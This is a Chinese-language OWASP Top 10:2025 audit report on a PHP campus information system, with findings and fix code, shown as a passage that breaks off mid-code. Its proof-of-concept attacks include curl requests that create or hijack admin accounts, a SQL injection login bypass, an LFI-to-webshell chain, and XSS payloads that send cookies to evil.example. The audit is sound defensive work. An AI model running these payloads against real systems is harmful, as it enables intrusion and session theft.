# web21 校園資訊系統 — 網頁安全檢查報告

> 依據：[OWASP Top 10:2025](https://owasp.org/Top10/2025/)
> 檢查範圍：`index.php`、`admin.php`、`api/`、`back/`、`front/`、`include/`、`js/`、`db21.sql`
> 檢查日期：2026-08-14
> 分支：`owasp`（含 `api/db.php`、`api/login.php` 尚未提交的修改）
> 性質：**純靜態程式碼審查**，未對執行中的系統做滲透測試

---

## 0. 總覽

本專案是一套 PHP + MySQL 的校園資訊系統，包含前台展示與後台管理。整體架構屬於「教學範例」等級：資料存取層用字串拼接組 SQL、頁面用 `include "$_GET[do].php"` 做路由、上傳檔案直接以原始檔名落地、密碼明文存放。

> **修復進度（2026-08-14 更新）**
> 第 1 階段的 9 項 Critical 問題已全部修復並驗證通過。
> 詳細的修改內容、驗證方式與尚未處理的項目，請見 [SECURITY-FIX-STAGE1.md](SECURITY-FIX-STAGE1.md)。
> 本檔維持稽核當下的原始記錄，未隨修復改寫。

**檢查結果：共發現 49 項問題，涵蓋 OWASP 2025 全部 10 個類別。**

| 嚴重度 | 數量 | 說明 |
|---|---|---|
| 🔴 Critical | 9 | 可直接導致伺服器被完全接管或資料庫被任意讀寫 |
| 🟠 High | 18 | 可導致未授權存取、帳密外洩、資料竄改 |
| 🟡 Medium | 17 | 需搭配其他條件，或影響範圍侷限 |
| 🔵 Low | 5 | 強化建議、深度防禦 |

**最需要注意的一句話總結：**
目前任何一個未登入的外部訪客，只要在網址列輸入 `admin.php`，就能進入後台；只要送出一個表單，就能上傳 `.php` 檔案並執行任意系統指令。這兩點是必須立刻處理的。

---

## 目錄

- [A01:2025 – Broken Access Control（權限控制失效）](#a012025--broken-access-control權限控制失效)
- [A02:2025 – Security Misconfiguration（安全設定缺失）](#a022025--security-misconfiguration安全設定缺失)
- [A03:2025 – Software Supply Chain Failures（軟體供應鏈失效）](#a032025--software-supply-chain-failures軟體供應鏈失效)
- [A04:2025 – Cryptographic Failures（加密機制失效）](#a042025--cryptographic-failures加密機制失效)
- [A05:2025 – Injection（注入攻擊）](#a052025--injection注入攻擊)
- [A06:2025 – Insecure Design（不安全的設計）](#a062025--insecure-design不安全的設計)
- [A07:2025 – Authentication Failures（身分驗證失效）](#a072025--authentication-failures身分驗證失效)
- [A08:2025 – Software or Data Integrity Failures（軟體與資料完整性失效）](#a082025--software-or-data-integrity-failures軟體與資料完整性失效)
- [A09:2025 – Security Logging and Alerting Failures（日誌與告警失效）](#a092025--security-logging-and-alerting-failures日誌與告警失效)
- [A10:2025 – Mishandling of Exceptional Conditions（例外狀況處理不當）](#a102025--mishandling-of-exceptional-conditions例外狀況處理不當)
- [附錄 A：問題總表](#附錄-a問題總表)
- [附錄 B：建議修復順序](#附錄-b建議修復順序)

---

## A01:2025 – Broken Access Control（權限控制失效）

> 2025 年版仍列第一名。本專案在此類別的問題最嚴重 —— 系統實際上**完全沒有存取控制**。

### 🔴 A01-1　後台首頁 `admin.php` 無任何登入檢查

**位置**：`admin.php:1`

```php
<?php include_once "./api/db.php";?>   ← 只有載入 DB，沒有任何身分檢查
```

`api/login.php:8` 登入成功時會設定 `$_SESSION['login']=1`，但**全專案沒有任何一行程式讀取這個變數**。

驗證：

```bash
$ grep -rn "SESSION\['login'\]" .
api/login.php:8:        $_SESSION['login']=1;      ← 只有寫入，沒有讀取
```

**攻擊方式**：直接瀏覽 `http://<站台>/admin.php`，無需帳號密碼即進入後台，可管理標題、廣告、圖片、最新消息、選單、**以及管理者帳號**。

**建議修復**：
1. 建立 `api/auth.php`：

```php
<?php
require_once __DIR__ . '/db.php';
if (empty($_SESSION['login']) || empty($_SESSION['admin_id'])) {
    header('Location: /index.php?do=login', true, 302);
    exit;   // ← exit 不可省略
}
```
2. 在 `admin.php` 最上方（`db.php` 之後）`require_once "./api/auth.php";`
3. 檢查失敗時務必 `exit`，僅 `header()` 不會停止後續程式輸出。

---

### 🔴 A01-2　所有 `api/*.php` 寫入端點皆無身分驗證

**位置**：`api/add.php`、`api/edit.php`、`api/update.php`、`api/edit_value.php`、`api/edit_total.php`、`api/edit_bottom.php`、`api/submenu.php`（全部檔案開頭只有 `include_once "db.php";`）

即使補上 A01-1 的頁面防護，這些 API 仍可被直接呼叫。**權限檢查必須做在伺服端的每個入口，而非只靠隱藏 UI。**

**攻擊示範（未登入即建立自己的管理員帳號）**：

```bash
curl -X POST "http://<站台>/api/add.php?table=admin" \
     -d "acc=hacker&pw=hacker"
```

`api/add.php:16-18` 對 `admin` 表只做了 `unset($_POST['pw2'])`，接著 `$db->save($_POST)` 直接寫入。攻擊者從此擁有合法後台帳號。

**其他可直接呼叫的破壞**：

```bash
# 刪除全部最新消息
curl -X POST "http://<站台>/api/edit.php?table=news" -d "id[]=1&del[]=1"
# 竄改頁尾版權文字（可植入 XSS payload）
curl -X POST "http://<站台>/api/edit_value.php?table=bottom" -d "id=1&bottom=<script>...</script>"
```

**建議修復**：在每個 `api/*.php` 第二行加入 `require_once __DIR__.'/auth.php';`。更穩固的做法是把 `api/` 目錄改為僅接受來自已驗證 session 的請求，並以單一 front controller 統一驗證。

---

### 🟠 A01-3　`include/` 目錄的片段檔可被直接存取

**位置**：`include/submenu.php:1`、`include/update_image.php`、`include/update_mvim.php`、`include/update_title.php`、`include/admin.php`

`include/submenu.php` 自行 `include_once "../api/db.php"`，因此可獨立執行：

```
http://<站台>/include/submenu.php?id=1
```

未登入者即可看到次選單的完整資料結構，也提供了一組現成的攻擊表單。

**建議修復**：
- 將 `include/`、`api/`、`back/`、`front/` 移出 web root（例如放到 `../app/`），web root 僅保留 `index.php`、`admin.php`、`css/`、`js/`、`icon/`、`upload/`。
- 若無法搬移，至少於每個片段檔開頭加上守門：

```php
<?php defined('APP_ENTRY') or exit('Forbidden'); ?>
```
並在 `index.php` / `admin.php` 定義 `define('APP_ENTRY', true);`。
- 或在 `include/`、`api/`、`back/`、`front/` 放 `.htaccess`（Apache）：`Require all denied`。

---

### 🟠 A01-4　「管理登出」只是清一個沒用的 Cookie，Session 從未銷毀

**位置**：`back/ad.php:11`、`back/admin.php:11`、`back/bottom.php:11`、`back/image.php:11`、`back/menu.php:11`、`back/mvim.php:11`、`back/news.php:11`、`back/total.php:11`

```html
<button onclick="document.cookie='user=';location.replace('index.php')">管理登出</button>
```

清除的是一個名為 `user` 的 Cookie —— 而系統**根本沒有使用這個 Cookie**（認證狀態存在 `$_SESSION` 裡）。登出後 `PHPSESSID` 依然有效。

`back/title.php:11` 更是連 Cookie 都不清，只做 `location.replace('index.php?do=login')`。

**風險**：使用者在公用電腦（例如學校電腦教室）「登出」後離開，下一個人按上一頁或直接輸入 `admin.php` 就能接手該 session。

**建議修復**：改為伺服端登出端點 `api/logout.php`：

```php
<?php
require_once __DIR__ . '/db.php';
$_SESSION = [];
if (ini_get('session.use_cookies')) {
    $p = session_get_cookie_params();
    setcookie(session_name(), '', time() - 42000,
              $p['path'], $p['domain'], $p['secure'], $p['httponly']);
}
session_destroy();
header('Location: /index.php', true, 302);
exit;
```
按鈕改為指向此端點的表單（POST，含 CSRF token）。

---

### 🟠 A01-5　「保護 admin 主帳號」只做在畫面上，後端未落實

**位置**：`back/admin.php:31`

```php
foreach($rows as $row):
    if($row['acc']!='admin'):     ← 只是「不顯示」預設管理員這一列
```

但 `api/edit.php:27-30` 對 `admin` 表毫無限制：

```php
case "admin":
    $row['acc']=$_POST['acc'][$idx];
    $row['pw']=$_POST['pw'][$idx];
```

**攻擊示範（未登入即改掉主管理員密碼）**：

```bash
curl -X POST "http://<站台>/api/edit.php?table=admin" \
     -d "id[]=1&acc[]=admin&pw[]=attacker_pw"
```

同理 `id[]=1&del[]=1` 可直接刪除主管理員。

**建議修復**：把保護規則寫進伺服端邏輯（例如 `admin` 表加 `is_protected` 欄位，或在 API 端硬性拒絕 `id=1`），不要依賴前端不顯示。同時檢查「不可刪除最後一個管理員」。

---

### 🟡 A01-6　缺乏權限分級（IDOR 的前置條件）

目前所有管理員權限完全相同，`admin` 表只有 `id / acc / pw` 三欄，沒有角色欄位。任何一個被新增的帳號都能刪除其他管理員、竄改全站內容。

**建議修復**：加入 `role` 欄位（`superadmin` / `editor`），在 API 層依角色檢查可操作的 `table` 白名單。

---

## A02:2025 – Security Misconfiguration（安全設定缺失）

> 2025 年版從第 5 名升至第 2 名。

### 🔴 A02-1　資料庫使用 `root` 帳號 + 空密碼，且硬編碼於原始碼

**位置**：`api/db.php:5,11`

```php
protected $dsn="mysql:host=localhost;charset=utf8;dbname=db21";
$this->pdo=new PDO($this->dsn,'root','');    ← root / 空密碼
```

三重問題：
1. **使用 root**：一旦發生 SQL Injection（見 A05-1），攻擊者取得的是資料庫最高權限 —— 可讀寫 `mysql` 系統表、跨資料庫存取，若 `secure_file_priv` 未設定甚至可用 `SELECT ... INTO OUTFILE` 寫入 webshell。
2. **空密碼**：任何能連到該主機 3306 埠的人都能直接登入。
3. **憑證寫死在程式碼並提交進 Git**：憑證輪替困難，且開發／測試／正式環境無法區隔。

**建議修復**：
```sql
CREATE USER 'db21_app'@'localhost' IDENTIFIED BY '<強密碼>';
GRANT SELECT, INSERT, UPDATE, DELETE ON db21.* TO 'db21_app'@'localhost';
-- 不給 DROP / ALTER / FILE / GRANT OPTION
```
憑證改由環境變數讀取，並將設定檔加入 `.gitignore`：
```php
$this->pdo = new PDO(
    getenv('DB_DSN'), getenv('DB_USER'), getenv('DB_PASS'),
    [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
     PDO::ATTR_EMULATE_PREPARES => false]
);
```

---

### 🔴 A02-2　`db21.sql` 放在 web root，內含全部明文管理員密碼

**位置**：`db21.sql`（專案根目錄，已提交至 Git）

```sql
INSERT INTO `admin` (`id`, `acc`, `pw`) VALUES
(1, 'admin', '1234'),
(3, 'superadmin', '12345678'),
(4, 'root', '5678');
```

**攻擊方式**：直接下載 `http://<站台>/db21.sql`，取得全站帳密與完整資料庫結構。這是掃描工具的標準檢查項目，會被自動化爬蟲在數分鐘內找到。

**建議修復**：
1. 立即將 `db21.sql` 移出 web root（例如 `docs/schema/`，並在部署時排除）。
2. 從資料庫傾印中移除實際帳密資料，只保留結構。
3. 由於已提交至 Git，**歷史紀錄中仍有這些密碼** —— 這幾組密碼必須全部視為已外洩並更換，不能只改檔案。
4. 建立 `.gitignore`，排除 `*.sql`、`upload/`、設定檔。

---

### 🟠 A02-3　除錯用的 `echo $sql;` 把 SQL 語句直接印到頁面上

**位置**：`api/db.php:46`（**此為本分支尚未提交的修改**）

```php
function count(...$arg){
    $sql="SELECT count(*) FROM $this->table ";
    ...
    echo $sql;                                   ← 除錯殘留
    return $this->pdo->query($sql)->fetchColumn();
}
```

`count()` 被 `index.php:40,98`、`front/main.php:40`、`front/news.php:12`、`back/menu.php:43`、`include/submenu.php:12`、`api/login.php:7` 呼叫，因此**每個訪客的每一頁都會看到完整 SQL 語句**，包含資料表名稱與 WHERE 條件。

最嚴重的是登入流程 `api/login.php:7` 的 `$Admin->count($_POST)`：

```
SELECT count(*) FROM admin  WHERE `acc`='admin' AND `pw`='1234'
```

**輸入的密碼會被原封不動印在回應頁面上**，同時洩漏了資料表結構與查詢邏輯（等於直接告訴攻擊者這裡可以做 SQL Injection、以及該用什麼欄位名）。

**建議修復**：立即移除這行。除錯輸出應改用 `error_log()` 寫入伺服器日誌，永不輸出到 HTTP 回應。正式環境設定 `display_errors=Off`、`log_errors=On`。

---

### 🟠 A02-4　`upload/` 目錄可執行 PHP

**位置**：`upload/`（無 `.htaccess` 或任何限制）

搭配 A06-3 的任意檔案上傳，攻擊者可上傳 `shell.php` 後直接以 `http://<站台>/upload/shell.php` 執行 —— 這是本專案最直接的**遠端程式碼執行（RCE）**路徑。

**建議修復**（Apache，於 `upload/.htaccess`）：
```apache
php_flag engine off
<FilesMatch "\.(php|phtml|php3|php4|php5|php7|php8|phar|inc|cgi|pl|htaccess)$">
    Require all denied
</FilesMatch>
```
Nginx：
```nginx
location ^~ /upload/ {
    location ~ \.php$ { return 403; }
}
```
最佳做法是把上傳檔案存到 web root 之外，透過 PHP 腳本驗證權限後以 `readfile()` 輸出，並帶上 `Content-Disposition` 與正確的 `Content-Type`。

---

### 🟡 A02-5　Session Cookie 缺少安全屬性

**位置**：`api/db.php:2`

```php
session_start();     ← 使用 PHP 預設值
```

預設情況下 `HttpOnly`、`Secure`、`SameSite` 皆未強制設定，session cookie 可被 JavaScript 讀取（配合 A05-3 的 XSS 即可竊取），也可能經明文 HTTP 傳輸。

**建議修復**（在 `session_start()` 之前）：
```php
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'secure'   => true,        // 需搭配 HTTPS
    'httponly' => true,
    'samesite' => 'Lax',       // 或 'Strict'
]);
session_start();
```

---

### 🟡 A02-6　缺少 HTTP 安全標頭

全站沒有設定任何安全標頭。

**建議修復**：
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'");
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Referrer-Policy: strict-origin-when-cross-origin');
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');  // HTTPS 環境
```

> 註：目前程式碼大量使用 inline `onclick=""` 與 inline `<script>`（`index.php:16,77,80,89,92`、`admin.php:15,78`、`back/*.php:11,53`），要導入嚴格 CSP 必須先把 inline 事件處理器改為 `addEventListener`。這項改造建議排在中期。

---

### 🟡 A02-7　舊版型與備份檔案暴露於 web root

**位置**：`102201/` 目錄（含 `版型檔案/`、`01P01.htm`~`01P04.htm`、`Administrator Login_files/` 等）

暴露了「Administrator Login」「Management page」等原始設計檔，讓攻擊者能推測後台路徑與結構。

**建議修復**：從部署包中移除 `102201/`；此類素材應留在版本庫的 `docs/` 而不隨部署上傳。

---

### 🔵 A02-8　`utf8` 而非 `utf8mb4`

**位置**：`api/db.php:5`（`charset=utf8`），但 `db21.sql` 建表使用 `utf8mb4`

連線字元集與資料表不一致。歷史上 `utf8`（實為 `utf8mb3`）曾與字元集轉換型的 SQL Injection 繞過技巧有關；現行寫法本身已因字串拼接而不安全（見 A05-1），但改用 prepared statement 時應一併把連線字元集對齊為 `utf8mb4`。

---

## A03:2025 – Software Supply Chain Failures（軟體供應鏈失效）

> 2025 年版的新／擴充類別（原 A06 Vulnerable and Outdated Components），排名第 3。

### 🟠 A03-1　jQuery 1.9.1（2013 年版本）存在多個已知 XSS 漏洞

**位置**：`js/jquery-1.9.1.min.js`，被 `index.php:8`、`admin.php:8` 載入

已知漏洞：

| CVE | 影響 | 與本專案的關聯 |
|---|---|---|
| CVE-2020-11022 | `.html()` / `.append()` 等對含 `<option>` 的 HTML 未正確清理 → XSS | 🔴 直接觸發 |
| CVE-2020-11023 | 同上，`<option>` 元素相關 | 🔴 直接觸發 |
| CVE-2019-11358 | `$.extend(true, ...)` 原型污染 | 🟡 目前未直接使用 |
| CVE-2015-9251 | 跨網域 AJAX 回應以 `text/javascript` 執行 | 🟠 `$.load()` 有關 |

**本專案的觸發點**（全部把不受信任的資料丟進 `.html()`）：

```javascript
// admin.php:82
$("#alt").html(""+$(this).children(".all").html()+"")
// front/main.php:61
$("#altt").html("<pre>" + $(this).children(".all").html() + "</pre>")
// front/news.php:66
$("#alt").html("<pre>"+$(this).children(".all").html()+"</pre>")
// index.php:87 / front/main.php:27（動態組 <embed>）
$("#mwww").html("<embed loop=true src='" + lin[now] + "' ...></embed>")
// js/js.js:27
$(y).load(url)
```

`.all` 的內容來自資料庫的 `news.text`（後台可任意輸入、且見 A01-2 未認證者也能寫入），等於「不受信任的 HTML → `.html()`」的教科書級組合。

**建議修復**：
1. 升級至 jQuery 3.7.x（`>= 3.5.0` 才修掉 CVE-2020-11022/11023）。升級需驗證 `.load()`、`.hover()`（3.x 仍支援）等 API 相容性。
2. 更根本的做法是把 `.html()` 改為 `.text()` —— 這些提示框只顯示純文字，不需要 HTML：
```javascript
$("#altt").text($(this).children(".all").text());
```
3. `$("#mwww").html("<embed ...>")` 改用 DOM API 建立元素並以 `.setAttribute()` 指定 src。

---

### 🟡 A03-2　沒有相依套件管理與更新機制

專案以手動下載的方式放入 jQuery，沒有 `composer.json`、`package.json`、鎖檔或 SBOM，因此：
- 無法得知目前使用的元件版本是否有新的 CVE
- 沒有自動化的弱點掃描（Dependabot / `composer audit` / `npm audit`）
- 沒有記錄元件來源與完整性雜湊

**建議修復**：導入 `composer` 管理 PHP 相依、`npm` 管理前端資產，啟用 GitHub Dependabot 或 OWASP Dependency-Check，並產出 SBOM（CycloneDX）。

---

### 🔵 A03-3　前端資產缺少完整性驗證

目前 jQuery 由本機提供，尚無 CDN 的中間人風險。但若未來改用 CDN，務必加上 SRI：

```html
<script src="https://cdn.../jquery-3.7.1.min.js"
        integrity="sha384-..." crossorigin="anonymous"></script>
```

---

## A04:2025 – Cryptographic Failures（加密機制失效）

### 🔴 A04-1　管理員密碼以明文儲存

**位置**：`db21.sql:54-67`（schema 與資料）、`api/add.php:27`、`api/edit.php:29`

```sql
CREATE TABLE `admin` (
  `id` int(10) UNSIGNED NOT NULL,
  `acc` text NOT NULL,
  `pw`  text NOT NULL          ← 明文，無雜湊、無 salt
);
INSERT INTO `admin` VALUES (1,'admin','1234'), (3,'superadmin','12345678'), (4,'root','5678');
```

新增與修改流程完全沒有雜湊：
```php
// api/add.php:27
$db->save($_POST);            // pw 原樣寫入
// api/edit.php:29
$row['pw']=$_POST['pw'][$idx];
```

**風險**：一旦資料庫被讀出（SQL Injection、備份外洩、`db21.sql` 被下載），所有密碼立即可用。多數使用者會重複使用密碼，影響會擴散到其他系統。

**建議修復**：
```php
// 寫入時
$hash = password_hash($plainPassword, PASSWORD_DEFAULT);

// 驗證時
$row = $Admin->findByAcc($acc);          // 以 prepared statement 取單筆
if ($row && password_verify($plain, $row['pw'])) {
    session_regenerate_id(true);
    $_SESSION['login']    = 1;
    $_SESSION['admin_id'] = $row['id'];
}
```
schema 改為 `pw VARCHAR(255) NOT NULL`（`password_hash` 的輸出長度需求）。
遷移策略：新增 `pw_hash` 欄位 → 使用者下次登入時驗證舊明文並寫入雜湊 → 全部轉換後刪除 `pw` 欄位。**同時要求所有管理員更換密碼**，因為舊密碼已在 Git 歷史中外洩。

---

### 🟠 A04-2　後台表單把明文密碼回填到 HTML 原始碼

**位置**：`back/admin.php:38`

```php
<input type="password" name="pw[]" value="<?= $row['pw']; ?>">
```

`type="password"` 只是把畫面上的字遮成圓點，**`value` 屬性仍是明文，存在於 HTML 原始碼中**。任何能開啟該頁面的人（見 A01-1：不需登入）按 `Ctrl+U` 檢視原始碼，或用開發者工具，即可看到全部管理員的密碼。瀏覽器的密碼管理員、頁面快取、公司代理伺服器日誌也可能保存這些內容。

**建議修復**：密碼欄位永遠不回填。改為留空的「新密碼（不修改請留空）」欄位，後端僅在該欄非空時才更新：

```php
if (!empty($_POST['pw'][$idx])) {
    $row['pw'] = password_hash($_POST['pw'][$idx], PASSWORD_DEFAULT);
}
```

---

### 🟡 A04-3　全站無 TLS 強制

登入表單 `front/login.php:6` 以 `method="post" action="api/login.php"` 送出，若站台以 HTTP 提供服務，帳號密碼與 `PHPSESSID` 皆為明文傳輸，同網段（例如校園 Wi-Fi）即可被側錄。

**建議修復**：部署 TLS 憑證（Let's Encrypt），HTTP 全站 301 導向 HTTPS，加上 HSTS 標頭，並將 session cookie 設為 `secure`。

---

## A05:2025 – Injection（注入攻擊）

> 2025 年版將 XSS 併入本類別。本專案的注入問題橫跨 SQL、檔案路徑、HTML/JS 三種。

### 🔴 A05-1　SQL Injection（全面性，資料存取層完全以字串拼接）

**位置**：`api/db.php` 全檔 —— `all():15-29`、`count():33-47`、`find():51-60`、`save():63-78`、`del():80-92`、`a2s():94-102`、`q():104-106`

核心問題在 `a2s()`：

```php
protected function a2s($array){
    $tmp=[];
    foreach($array as $key => $val){
        $tmp[]="`$key`='$val'";      ← key 與 value 皆直接內插，無跳脫、無參數繫結
    }
    return $tmp;
}
```

以及 `save()` 的 INSERT：

```php
$sql="INSERT INTO $this->table (`".join("`,`",$keys)."`) VALUES('".join("','",$arg)."');";
```

**整個專案沒有任何一處使用 `prepare()` / `bindValue()`。**

#### 攻擊面 1：登入表單（最危險）

`api/login.php:7` 把整個 `$_POST` 陣列交給 `count()`：

```php
if($Admin->count($_POST)>0){ $_SESSION['login']=1; ... }
```

第 3-4 行雖然加了 `htmlspecialchars(trim(...))`，但這個防禦是**不完整且用錯地方**的：

1. **只處理了 `acc` 和 `pw` 兩個欄位。** `$_POST` 的其他欄位原封不動流入 SQL。攻擊者只要多送一個參數：
   ```bash
   curl -X POST http://<站台>/api/login.php \
        -d "acc=x&pw=y&z=1' OR '1'='1"
   ```
   產生：
   ```sql
   SELECT count(*) FROM admin  WHERE `acc`='x' AND `pw`='y' AND `z`='1' OR '1'='1'
   ```
   `OR '1'='1'` 使 count > 0 → **未持有任何帳密即登入成功**。

2. **陣列的「key」也被拼進 SQL，且完全沒有經過任何處理。** 送出參數名為 `` acc`='a' OR `1 `` 即可從反引號脫逸。

3. **`htmlspecialchars` 不是 SQL 的防禦機制。** 它是輸出到 HTML 時的跳脫函式；用在輸入端會造成：
   - 密碼中的 `< > & " '` 被改寫，使用者無法用真正的密碼登入（正確性 bug）
   - 在 PHP 8.1 以前預設旗標為 `ENT_COMPAT`，**不會轉換單引號**，SQL Injection 完全不受阻擋

4. **`$_POST['acc']` 在 `isset()` 檢查之前就被存取**（第 3 行 vs 第 6 行），以 GET 或空 body 存取會產生 `Undefined array key` 警告；PHP 8.1+ 對 `htmlspecialchars(null)` 另有 deprecated 警告。

#### 攻擊面 2：所有後台寫入

```php
// api/add.php:27, api/edit_value.php:5, api/edit_bottom.php:5 …
$db->save($_POST);       // $_POST 的 key 與 value 全部直接進 SQL
```
```php
// api/edit.php:9,11,41 — $id 來自 $_POST['id'][]
$db->del($id);           // DELETE FROM t WHERE `id`='<可控>'
$row=$db->find($id);
```
搭配 A01-2（API 無驗證），**未登入的攻擊者即可對資料庫執行任意 SQL**，且連線身分是 `root`（見 A02-1）。

**建議修復**：重寫 `DB` 類別，全面改用 prepared statement，並以白名單驗證欄位名。

```php
class DB {
    private const COLUMNS = [
        'admin' => ['acc', 'pw'],
        'news'  => ['text', 'sh'],
        'menu'  => ['text', 'href', 'sh', 'main_id'],
        // ... 每個資料表明確列出允許的欄位
    ];

    private function assertColumns(array $data): array {
        $allowed = self::COLUMNS[$this->table] ?? [];
        $bad = array_diff(array_keys($data), array_merge($allowed, ['id']));
        if ($bad) throw new InvalidArgumentException('illegal column: '.implode(',', $bad));
        return $data;
    }

    public function find(int $id): ?array {
        $st = $this->pdo->prepare("SELECT * FROM `{$this->table}` WHERE `id` = :id");
        $st->execute([':id' => $id]);
        return $st->fetch(PDO::FETCH_ASSOC) ?: null;
    }

    public function insert(array $data): int {
        $data = $this->assertColumns($data);
        $cols = array_keys($data);
        $ph   = array_map(fn($c) => ":$c", $cols);
        $sql  = sprintf('INSERT INTO `%s` (`%s`) VALUES (%s)',
                        $this->table, implode('`,`', $cols), implode(',', $ph));
        $this->pdo->prepare($sql)->execute($data);
        return (int)$this->pdo->lastInsertId();
    }

    public function update(int $id, array $data): int {
        $data = $this->assertColumns($data);
        unset($data['id']);
        $set = implode(', ', array_map(fn($c) => "`$c` = :$c", array_keys($data)));
        $st  = $this->pdo->prepare("UPDATE `{$this->table}` SET $set WHERE `id` = :__id");
        $st->execute($data + [':__id' => $id]);
        return $st->rowCount();
    }
}
```
建構 PDO 時務必加上 `PDO::ATTR_EMULATE_PREPARES => false`，確保使用資料庫端的真實預備語句。

---

### 🔴 A05-2　本地檔案引入（LFI）／路徑遍歷 → 遠端程式碼執行

**位置**：`index.php:66-72`、`admin.php:68-74`

```php
$do=$_GET['do']??"main";
$file="front/$do.php";
if(file_exists($file)){
    include $file;          ← $do 完全由使用者控制，未做白名單或路徑正規化
}else{
    include "front/main.php";
}
```

`file_exists()` **不是安全檢查** —— 它只確認檔案存在，不阻擋 `../`。

**攻擊鏈（本專案最嚴重的問題）**：

```
步驟 1：透過 api/add.php?table=image 上傳 shell.php（無需登入，見 A01-2 + A06-3）
        → 檔案落在 upload/shell.php
步驟 2：瀏覽 index.php?do=../upload/shell
        → include "front/../upload/shell.php"
        → 攻擊者的 PHP 程式碼在伺服器上執行
```

即使 A02-4（`upload/` 禁止執行 PHP）已修補，**這條 LFI 路徑仍可繞過**，因為 `include` 是由 PHP 直譯器主動載入，不經過 Web Server 的目錄規則。因此 A02-4 與 A05-2 必須**兩者都修**。

其他可讀取的目標：
```
admin.php?do=../api/db          → 重新執行 db.php（會再次觸發訪客計數）
index.php?do=../../<任意路徑>   → 讀取 web root 之外的 .php 檔
```

**建議修復**：改用白名單對映，禁止任何使用者輸入進入路徑：

```php
$routes = [
    'main'  => 'front/main.php',
    'news'  => 'front/news.php',
    'login' => 'front/login.php',
];
$do   = $_GET['do'] ?? 'main';
$file = $routes[$do] ?? $routes['main'];   // 找不到就用預設，不拼接
include __DIR__ . '/' . $file;
```

`admin.php` 同理，另建一份後台路由表（`title` / `ad` / `mvim` / `image` / `total` / `bottom` / `news` / `admin` / `menu`）。

---

### 🟠 A05-3　儲存型 XSS（Stored XSS）— 全站輸出未跳脫

**位置**（皆為直接輸出資料庫內容，無任何跳脫）：

| 檔案:行 | 輸出內容 | 來源 |
|---|---|---|
| `index.php:23` | `<a title="<?= $title['text'] ?>">` | `title.text` |
| `index.php:25` | `background:url('upload/<?= $title['img'] ?>')` | `title.img`（可跳出 CSS `url()`）|
| `index.php:37,45` | `<a href="<?= $main['href'] ?>"><?= $main['text'] ?></a>` | `menu.href` / `menu.text` |
| `index.php:87` | `<img src="upload/<?= $img['img'] ?>">` | `image.img` |
| `index.php:122`、`admin.php:96` | 頁尾版權文字 | `bottom.bottom` |
| `include/marquee.php:6` | `echo $ad['text'];` | `ad.text`（**出現在前台每一頁**）|
| `front/main.php:51-52` | 最新消息標題與完整內容 | `news.text` |
| `front/news.php:26-27` | 同上 | `news.text` |
| `back/*.php` | `value="<?= $row['text'] ?>"` 等 | 各資料表 |

**攻擊示範**：由於 `api/*.php` 無需登入（A01-2），任何人皆可寫入 payload：

```bash
curl -X POST "http://<站台>/api/add.php?table=ad" \
     -d "text=</marquee><script>fetch('https://evil.example/?c='+document.cookie)</script>"
```

`include/marquee.php` 被 `front/main.php:2`、`front/news.php:2`、`front/login.php:3` 全部引入，因此 payload 會在**前台每一頁**執行，可竊取管理員的 session cookie（因 A02-5 未設 HttpOnly）。

`menu.href` 的情境更直接：
```bash
curl -X POST "http://<站台>/api/add.php?table=menu" \
     -d "text=校園導覽&href=javascript:fetch('https://evil.example/?c='%2bdocument.cookie)"
```
產生 `<a href="javascript:...">`，使用者一點選即觸發。

**建議修復**：
1. 建立輸出跳脫輔助函式，並在**所有** `<?= ?>` 使用：
```php
function e(?string $s): string {
    return htmlspecialchars($s ?? '', ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}
```
```php
<a title="<?= e($title['text']) ?>" href="index.php">
<?= e($n['text']) ?>
```
2. `href` 屬性需額外驗證通訊協定，僅允許 `http` / `https` / 相對路徑：
```php
function safe_url(string $u): string {
    $u = trim($u);
    if (preg_match('#^(https?://|/|\./|\?)#i', $u)) return e($u);
    return '#';
}
```
3. 前端 `.html()` 一律改為 `.text()`（見 A03-1）。
4. 對 `marquee`、`news` 這類允許少量格式的欄位，若確實需要 HTML，改用 HTMLPurifier 之類的白名單清理器，不要自行寫正規表示式過濾。

---

### 🟠 A05-4　反射型 XSS（Reflected XSS）

#### (a) `admin.php` 的 `$do` 參數

**位置**：`admin.php:68` → `back/title.php:19,62`

當 `file_exists("back/$do.php")` 為 false 時，程式 fallback 到 `include "back/title.php"`，但 **`$do` 變數仍保留使用者輸入的原值**，而 `back/title.php` 中有：

```php
<form method="post" action="./api/edit.php?table=<?= $do ?>">        // :19
<input type="button" onclick="op('#cover','#cvr','include/<?= $do; ?>.php')">  // :62
```

**PoC**：
```
http://<站台>/admin.php?do="><script>alert(document.domain)</script>
```
所有 `back/*.php` 都有同樣的 `<?= $do ?>` 模式（`ad.php:19,53`、`admin.php:19,55`、`image.php:19,86`、`menu.php:20,64`、`mvim.php:19,58`、`news.php:19,81`、`total.php:19`、`bottom.php:19`）。

#### (b) `include/` 片段檔的 `$_GET['id']`

**位置**：`include/submenu.php:28`、`include/update_image.php:13`、`include/update_mvim.php:11`、`include/update_title.php:11`

```php
<input type="hidden" name="main_id" value="<?= $_GET['id']; ?>">
```

**PoC**：
```
http://<站台>/include/submenu.php?id="><script>alert(1)</script>
```

**建議修復**：路由改白名單後 `$do` 即成為受控值；`$_GET['id']` 應強制轉型 `(int)` 並以 `e()` 跳脫輸出。

---

### 🟠 A05-5　JavaScript 內容注入（透過檔名）

**位置**：`front/main.php:17`

```php
echo "lin.push('upload/{$mv['img']}')\n";
```

資料庫的 `mvim.img` 直接寫進 JavaScript 字串常值。由於檔名是使用者上傳時決定的（`api/add.php:9` 使用 `$_FILES['img']['name']` 原始檔名，未做任何清理），攻擊者可上傳檔名為：

```
x');alert(document.cookie);//.gif
```

產生：
```javascript
lin.push('upload/x');alert(document.cookie);//.gif')
```

同樣的問題也出現在 `index.php:98`：
```php
var nowpage=0,num=<?= $Image->count(['sh'=>1]); ?>;
```
（此處來源是 COUNT 結果，風險較低，但因 `count()` 目前還會 `echo $sql`（A02-3），實際輸出會是「SQL 字串 + 數字」，導致 JavaScript 語法錯誤 —— 這也印證了 A02-3 的立即影響。）

**建議修復**：把資料傳給 JS 時一律用 `json_encode()` 並指定安全旗標：
```php
$imgs = array_column($Mvim->all(['sh' => 1]), 'img');
?>
<script>
var lin = <?= json_encode(
